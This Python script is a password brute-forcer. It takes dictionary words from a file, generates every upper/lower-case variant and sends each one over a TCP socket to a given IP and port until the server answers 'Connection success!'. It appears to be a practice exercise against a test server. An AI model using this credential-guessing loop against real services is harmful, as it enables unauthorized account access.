import sys
import socket
from itertools import product
from path import file_path


def pass_gen():  # The generator will sort through all the variants of upper and lower letters in a word from file
    with open(file_path, 'r') as file:
        for line in file:
            pass_list = []
            for letter in line.strip():
                pass_list.append(letter.lower() + letter.upper())
            for i in product(*pass_list):
                yield ''.join(i)


if len(sys.argv) < 3:  # Running the program should look like "python3 hack.py localhost 9090"
    print('Input: IP address and port for sending')
    sys.exit(1)
ip, port = sys.argv[1], int(sys.argv[2])

gen = pass_gen()
with socket.socket() as client_socket:
    client_socket.connect((ip, port))
    while True:
        message = next(gen)
        client_socket.send(message.encode())
        response = client_socket.recv(256).decode()
        if response == 'Connection success!':
            client_socket.close()
            break
print(message)
